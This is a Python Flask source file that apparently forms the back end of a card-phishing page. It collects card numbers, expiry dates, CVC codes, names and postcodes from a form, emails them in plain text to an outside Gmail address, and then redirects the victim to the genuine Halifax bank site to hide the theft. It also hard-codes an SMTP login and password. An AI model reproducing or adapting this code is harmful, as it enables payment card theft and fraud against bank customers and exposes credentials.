from flask import Flask, render_template, request, redirect
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# SMTP configuration
smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_user = 'supprtwindowsteam@gmail.com'  # Use environment variables or secure methods to handle credentials
smtp_password = 'sjqj ljer dnel jkrn'  # Use environment variables or secure methods to handle credentials
to_email = 'lucybryan192@gmail.com'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        card_number = request.form['card-number']
        exp_date = request.form['exp-date']
        cvc = request.form['cvc']
        cardholder_name = request.form['cardholder-name']
        country_region = request.form['country-region']
        postal_code = request.form['postal-code']

        # Prepare email content
        email_content = f"""
        Card Number: {card_number}
        Expiration Date: {exp_date}
        CVC: {cvc}
        Cardholder Name: {cardholder_name}
        Country or Region: {country_region}
        Postal Code: {postal_code}
        """
        
        msg = MIMEMultipart()
        msg['Subject'] = 'New Card Information Submitted'
        msg['From'] = smtp_user
        msg['To'] = to_email
        
        # Attach the email content
        msg.attach(MIMEText(email_content))

        # Send the email
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_user, smtp_password)
                server.sendmail(smtp_user, to_email, msg.as_string())
            print('Email sent successfully!')
        except Exception as e:
            print('Failed to send email:', e)
        
        # Redirect to Halifax website
        return redirect('https://www.halifax.co.uk')
           
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
